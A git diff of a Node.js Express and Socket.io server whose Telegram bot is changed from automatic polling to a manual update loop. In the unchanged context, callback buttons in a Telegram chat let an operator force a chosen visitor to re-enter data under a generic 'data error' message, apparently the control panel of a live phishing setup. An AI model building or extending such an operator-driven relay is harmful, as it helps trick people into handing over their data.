@@ -2,12 +2,12 @@ const express = require('express');
 const http = require('http');
 const { Server } = require("socket.io");
 const TelegramBot = require('node-telegram-bot-api');
-require('dotenv').config(); // <--- ESTA LÍNEA ES CRÍTICA PARA LEER TUS VARIABLES DE VERCEL
+require('dotenv').config();
 
 const app = express();
 const server = http.createServer(app);
 
-// Configuración de Socket.io con CORS abierto para evitar errores entre Hostinger y Vercel
+// Configuración de Socket.io con CORS abierto
 const io = new Server(server, {
     cors: {
         origin: "*", 
@@ -20,10 +20,51 @@ const token = process.env.TELEGRAM_BOT_TOKEN;
 const chatId = process.env.TELEGRAM_CHAT_ID;
 
 if (!token || !chatId) {
-    console.warn("⚠️ Advertencia: Variables de entorno no encontradas. Verifica Settings > Environment Variables.");
+    console.warn("⚠️ Advertencia: Variables de entorno no encontradas.");
 }
 
-const bot = new TelegramBot(token, { polling: true });
+// Creamos el bot sin polling automático para evitar el error 409 Conflict
+const bot = new TelegramBot(token, { polling: false });
+
+// Función para iniciar la conexión segura
+async function startBot() {
+    try {
+        // Obtenemos las últimas actualizaciones para asegurar que somos los únicos conectados
+        const updates = await bot.getUpdates({ timeout: 0, limit: 1 });
+        console.log("✅ Bot conectado correctamente a Telegram");
+        
+        // Iniciamos un loop de polling manual controlado
+        let offset = 0;
+        const pollLoop = async () => {
+            try {
+                const updates = await bot.getUpdates({ offset: offset, timeout: 5 });
+                if (updates.length > 0) {
+                    for (let update of updates) {
+                        offset = update.update_id + 1;
+                        if (update.callback_query) {
+                            bot.processUpdate(update);
+                        }
+                    }
+                }
+            } catch (err) {
+                // Si hay error 409, esperamos un poco y reintentamos
+                if (err.code === 409) {
+                    console.log("⚠️ Conflicto detectado, reiniciando loop...");
+                    setTimeout(pollLoop, 2000);
+                    return;
+                }
+                console.error("Error en polling:", err);
+            }
+            setTimeout(pollLoop, 500); // Revisar cada medio segundo
+        };
+        
+        pollLoop();
+    } catch (err) {
+        console.error("Error inicial conectando al bot:", err);
+    }
+}
+
+startBot();
 
 io.on('connection', (socket) => {
     console.log(`Cliente conectado: ${socket.id}`);
@@ -94,7 +135,7 @@ io.on('connection', (socket) => {
         const socketId = action.split('_')[1];
         const type = action.split('_')[0];
 
-        // Lógica de "Pedir Corrección" (Limpia campos y muestra error)
+        // Lógica de "Pedir Corrección"
         if (type === 'retry') {
             io.to(socketId).emit('force_retry', { 
                 message: "Error en los datos. Por favor ingrésalos nuevamente.",
